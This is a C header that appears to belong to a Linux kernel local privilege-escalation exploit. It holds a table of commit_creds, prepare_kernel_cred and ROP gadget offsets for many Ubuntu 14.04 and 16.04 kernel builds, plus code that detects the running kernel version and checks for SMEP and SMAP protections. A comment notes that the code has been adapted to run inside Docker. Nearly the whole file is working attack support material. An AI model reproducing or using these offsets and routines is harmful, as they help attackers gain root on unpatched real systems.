#ifndef _kernel_infos_h
#define _kernel_infos_h

#include "./toolset.h"

// Will be overwritten by detect_versions().
int kernel = -1;

struct kernel_info {
	const char* distro;
	const char* version;
	uint64_t commit_creds;
	uint64_t prepare_kernel_cred;
	uint64_t xchg_eax_esp_ret;
	uint64_t pop_rdi_ret;
	uint64_t mov_dword_ptr_rdi_eax_ret;
	uint64_t mov_rax_cr4_ret;
	uint64_t neg_rax_ret;
	uint64_t pop_rcx_ret;
	uint64_t or_rax_rcx_ret;
	uint64_t xchg_eax_edi_ret;
	uint64_t mov_cr4_rdi_ret;
	uint64_t jmp_rcx;
};

struct kernel_info kernels[] = {
	{ "14.04", "4.4.0-21-generic", 0x9d7a0, 0x9da80, 0x4520a, 0x30f75, 0x109957, 0x1a7a0, 0x3d6b7a, 0x1cbfc, 0x76453, 0x49d4d, 0x61300, 0x1b91d },
	{ "14.04", "4.4.0-22-generic", 0x9d7e0, 0x9dac0, 0x4521a, 0x28c19d, 0x1099b7, 0x1a7f0, 0x3d781a, 0x1cc4c, 0x764b3, 0x49d5d, 0x61300, 0x48040 },
	{ "14.04", "4.4.0-24-generic", 0x9d5f0, 0x9d8d0, 0x4516a, 0x1026cd, 0x107757, 0x1a810, 0x3d7a9a, 0x1cc6c, 0x763b3, 0x49cbd, 0x612f0, 0x47fa0 },
	{ "14.04", "4.4.0-28-generic", 0x9d760, 0x9da40, 0x4516a, 0x3dc58f, 0x1079a7, 0x1a830, 0x3d801a, 0x1cc8c, 0x763b3, 0x49cbd, 0x612f0, 0x47fa0 },
	{ "14.04", "4.4.0-31-generic", 0x9d760, 0x9da40, 0x4516a, 0x3e223f, 0x1079a7, 0x1a830, 0x3ddcca, 0x1cc8c, 0x763b3, 0x49cbd, 0x612f0, 0x47fa0 },
	{ "14.04", "4.4.0-34-generic", 0x9d760, 0x9da40, 0x4510a, 0x355689, 0x1079a7, 0x1a830, 0x3ddd1a, 0x1cc8c, 0x763b3, 0x49c5d, 0x612f0, 0x47f40 },
	{ "14.04", "4.4.0-36-generic", 0x9d770, 0x9da50, 0x4510a, 0x1eec9d, 0x107a47, 0x1a830, 0x3de02a, 0x1cc8c, 0x763c3, 0x29595, 0x61300, 0x47f40 },
	{ "14.04", "4.4.0-38-generic", 0x9d820, 0x9db00, 0x4510a, 0x598fd, 0x107af7, 0x1a820, 0x3de8ca, 0x1cc7c, 0x76473, 0x49c5d, 0x61300, 0x1a77b },
	{ "14.04", "4.4.0-42-generic", 0x9d870, 0x9db50, 0x4510a, 0x5f13d, 0x107b17, 0x1a820, 0x3deb7a, 0x1cc7c, 0x76463, 0x49c5d, 0x61300, 0x1a77b },
	{ "14.04", "4.4.0-45-generic", 0x9d870, 0x9db50, 0x4510a, 0x5f13d, 0x107b17, 0x1a820, 0x3debda, 0x1cc7c, 0x76463, 0x49c5d, 0x61300, 0x1a77b },
	{ "14.04", "4.4.0-47-generic", 0x9d940, 0x9dc20, 0x4511a, 0x171f8d, 0x107bd7, 0x1a820, 0x3e241a, 0x1cc7c, 0x76463, 0x299f5, 0x61300, 0x1a77b },
	{ "14.04", "4.4.0-51-generic", 0x9d920, 0x9dc00, 0x4511a, 0x21f15c, 0x107c77, 0x1a820, 0x3e280a, 0x1cc7c, 0x76463, 0x49c6d, 0x61300, 0x1a77b },
	{ "14.04", "4.4.0-53-generic", 0x9d920, 0x9dc00, 0x4511a, 0x21f15c, 0x107c77, 0x1a820, 0x3e280a, 0x1cc7c, 0x76463, 0x49c6d, 0x61300, 0x1a77b },
	{ "14.04", "4.4.0-57-generic", 0x9ebb0, 0x9ee90, 0x4518a, 0x39401d, 0x1097d7, 0x1a820, 0x3e527a, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "14.04", "4.4.0-59-generic", 0x9ebb0, 0x9ee90, 0x4518a, 0x2dbc4e, 0x1097d7, 0x1a820, 0x3e571a, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "14.04", "4.4.0-62-generic", 0x9ebe0, 0x9eec0, 0x4518a, 0x3ea46f, 0x109837, 0x1a820, 0x3e5e5a, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "14.04", "4.4.0-63-generic", 0x9ebe0, 0x9eec0, 0x4518a, 0x2e2e7d, 0x109847, 0x1a820, 0x3e61ba, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "14.04", "4.4.0-64-generic", 0x9ebe0, 0x9eec0, 0x4518a, 0x2e2e7d, 0x109847, 0x1a820, 0x3e61ba, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "14.04", "4.4.0-66-generic", 0x9ebe0, 0x9eec0, 0x4518a, 0x2e2e7d, 0x109847, 0x1a820, 0x3e61ba, 0x1cc7c, 0x77493, 0x49cdd, 0x62300, 0x1a77b },
	{ "14.04", "4.4.0-67-generic", 0x9eb60, 0x9ee40, 0x4518a, 0x12a9dc, 0x109887, 0x1a820, 0x3e67ba, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "14.04", "4.4.0-70-generic", 0x9eb60, 0x9ee40, 0x4518a, 0xd61a2, 0x109887, 0x1a820, 0x3e63ca, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "14.04", "4.4.0-71-generic", 0x9eb60, 0x9ee40, 0x4518a, 0xd61a2, 0x109887, 0x1a820, 0x3e63ca, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "14.04", "4.4.0-72-generic", 0x9eb60, 0x9ee40, 0x4518a, 0xd61a2, 0x109887, 0x1a820, 0x3e63ca, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "14.04", "4.4.0-75-generic", 0x9eb60, 0x9ee40, 0x4518a, 0x303cfd, 0x1098a7, 0x1a820, 0x3e67ea, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "14.04", "4.4.0-78-generic", 0x9eb70, 0x9ee50, 0x4518a, 0x30366d, 0x1098b7, 0x1a820, 0x3e710a, 0x1cc7c, 0x774c3, 0x49cdd, 0x62330, 0x1a77b },
	{ "14.04", "4.4.0-79-generic", 0x9ebb0, 0x9ee90, 0x4518a, 0x3ebdcf, 0x1099a7, 0x1a830, 0x3e77ba, 0x1cc8c, 0x774e3, 0x49cdd, 0x62330, 0x1a78b },
	{ "14.04", "4.4.0-81-generic", 0x9ebb0, 0x9ee90, 0x4518a, 0x2dc688, 0x1099a7, 0x1a830, 0x3e789a, 0x1cc8c, 0x774e3, 0x24487, 0x62330, 0x1a78b },
	{ "14.04", "4.4.0-83-generic", 0x9ebc0, 0x9eea0, 0x451ca, 0x2dc6f5, 0x1099b7, 0x1a830, 0x3e78fa, 0x1cc8c, 0x77533, 0x49d1d, 0x62360, 0x1a78b },
	{ "16.04", "4.8.0-34-generic", 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80 },
	{ "16.04", "4.8.0-36-generic", 0xa5d50, 0xa6140, 0x17d15, 0x6854d, 0x119227, 0x1b230, 0x4390da, 0x206c23, 0x7bcf3, 0x12c7f7, 0x64210, 0x49f80 },
	{ "16.04", "4.8.0-39-generic", 0xa5cf0, 0xa60e0, 0x17c55, 0xf3980, 0x1191f7, 0x1b170, 0x43996a, 0x2e8363, 0x7bcf3, 0x12c7c7, 0x64210, 0x49f60 },
	{ "16.04", "4.8.0-41-generic", 0xa5cf0, 0xa60e0, 0x17c55, 0xf3980, 0x1191f7, 0x1b170, 0x43996a, 0x2e8363, 0x7bcf3, 0x12c7c7, 0x64210, 0x49f60 },
	{ "16.04", "4.8.0-45-generic", 0xa5cf0, 0xa60e0, 0x17c55, 0x100935, 0x1191f7, 0x1b170, 0x43999a, 0x185493, 0x7bcf3, 0xdfc5, 0x64210, 0x49f60 },
	{ "16.04", "4.8.0-46-generic", 0xa5cf0, 0xa60e0, 0x17c55, 0x100935, 0x1191f7, 0x1b170, 0x43999a, 0x185493, 0x7bcf3, 0x12c7c7, 0x64210, 0x49f60 },
	{ "16.04", "4.8.0-49-generic", 0xa5d00, 0xa60f0, 0x17c55, 0x301f2d, 0x119207, 0x1b170, 0x439bba, 0x102e33, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },
	{ "16.04", "4.8.0-52-generic", 0xa5d00, 0xa60f0, 0x17c55, 0x301f2d, 0x119207, 0x1b170, 0x43a0da, 0x63e843, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },
	{ "16.04", "4.8.0-54-generic", 0xa5d00, 0xa60f0, 0x17c55, 0x301f2d, 0x119207, 0x1b170, 0x43a0da, 0x5ada3c, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },
	{ "16.04", "4.8.0-56-generic", 0xa5d00, 0xa60f0, 0x17c55, 0x39d50d, 0x119207, 0x1b170, 0x43a14a, 0x44d4a0, 0x7bd03, 0x12c7d7, 0x64210, 0x49f60 },
	{ "16.04", "4.8.0-58-generic", 0xa5d20, 0xa6110, 0x17c55, 0xe56f5, 0x119227, 0x1b170, 0x439e7a, 0x162622, 0x7bd23, 0x12c7f7, 0x64210, 0x49fa0 },
};

/* The following get_distro_codename() is not applicable inside docker 
#define LSB_RELEASE_LENGTH 1024
void get_distro_codename(char* output, int max_length) {
	char buffer[LSB_RELEASE_LENGTH];
	int length = read_file("/etc/lsb-release", &buffer[0], LSB_RELEASE_LENGTH);
	if (length == -1) {
		perror("[-] open/read(/etc/lsb-release)");
		exit(EXIT_FAILURE);
	}
	const char *needle = "DISTRIB_CODENAME=";
	int needle_length = strlen(needle);
	char* found = memmem(&buffer[0], length, needle, needle_length);
	if (found == NULL) {
		printf("[-] couldn't find DISTRIB_CODENAME in /etc/lsb-release\n");
		exit(EXIT_FAILURE);
	}
	int i;
	for (i = 0; found[needle_length + i] != '\n'; i++) {
		assert(i < max_length);
		assert((found - &buffer[0]) + needle_length + i < length);
		output[i] = found[needle_length + i];
	}
}
*/
void get_kernel_version(char* output, int max_length) {
	struct utsname u;
	int rv = uname(&u);
	if (rv != 0) {
		perror("[-] uname()");
		exit(EXIT_FAILURE);
	}
	assert(strlen(u.release) <= max_length);
	strcpy(&output[0], u.release);
}

#define PROC_VERSION_LENGTH 512
void get_distro_codename(char* output, int max_length) {
	char buffer[PROC_VERSION_LENGTH];
	int length = read_file("/proc/version", &buffer[0], PROC_VERSION_LENGTH);
	if (length == -1) {
		perror("[-] open or read(/proc/version)");
		exit(EXIT_FAILURE);
	}
	const char *needle = "ubuntu1~";
	int needle_length = strlen(needle);
	char* found = memmem(&buffer[0], length, needle, needle_length);
	if (found == NULL) {
		printf("[-] couldn't find \"ubuntu1~\" in /proc/version\n");
		exit(EXIT_FAILURE);
	}
	int i;
	for (i = 0; found[needle_length + i] != ')'; i++) {
		assert(i < max_length);
		assert((found - &buffer[0]) + needle_length + i < length);
		output[i] = found[needle_length + i];
	}
}

#define ARRAY_SIZE(x) (sizeof(x) / sizeof((x)[0]))
#define DISTRO_CODENAME_LENGTH 32
#define KERNEL_VERSION_LENGTH 32
int detect_versions() {
	char codename[DISTRO_CODENAME_LENGTH];
	char version[KERNEL_VERSION_LENGTH];
	get_distro_codename(&codename[0], DISTRO_CODENAME_LENGTH);
	get_kernel_version(&version[0], KERNEL_VERSION_LENGTH);
	int i;
	for (i = 0; i < ARRAY_SIZE(kernels); i++) {
		if (strncmp(&codename[0], kernels[i].distro, strlen(kernels[i].distro)) == 0 &&
		    strcmp(&version[0], kernels[i].version) == 0) {
			// printf("[.] kernel version '%s' detected\n", kernels[i].version);
			return i;
		}
	}

	printf("[-] kernel version not recognized\n");
	exit(EXIT_FAILURE);
}

#define PROC_CPUINFO_LENGTH 4096
// 0 - nothing, 1 - SMEP, 2 - SMAP, 3 - SMEP & SMAP
int smap_smep_enabled() {
	char buffer[PROC_CPUINFO_LENGTH];
	int length = read_file("/proc/cpuinfo", &buffer[0], PROC_CPUINFO_LENGTH);
	if (length == -1) {
		perror("[-] open /read(/proc/cpuinfo)");
		exit(EXIT_FAILURE);
	}
	int rv = 0;
	char* found = memmem(&buffer[0], length, "smep", 4);
	if (found != NULL)
		rv += 1;
	found = memmem(&buffer[0], length, "smap", 4);
	if (found != NULL)
		rv += 2;
	return rv;
}

void check_smep_smap() {
	int rv = smap_smep_enabled();
	if (rv >= 2) {
		printf("[-] SMAP detected, no bypass available\n");
		exit(EXIT_FAILURE);
	}
	if (rv >= 1) {
		printf("[-] SMEP detected, use ENABLE_SMEP_BYPASS\n");
		exit(EXIT_FAILURE);
	}
}

static inline void native_cpuid(unsigned int *eax, unsigned int *ebx,
                                unsigned int *ecx, unsigned int *edx)
{
    /* ecx is often an input as well as an output. */
    asm volatile("cpuid"
        : "=a" (*eax),
          "=b" (*ebx),
          "=c" (*ecx),
          "=d" (*edx)
        : "0" (*eax), "2" (*ecx));
}

#endif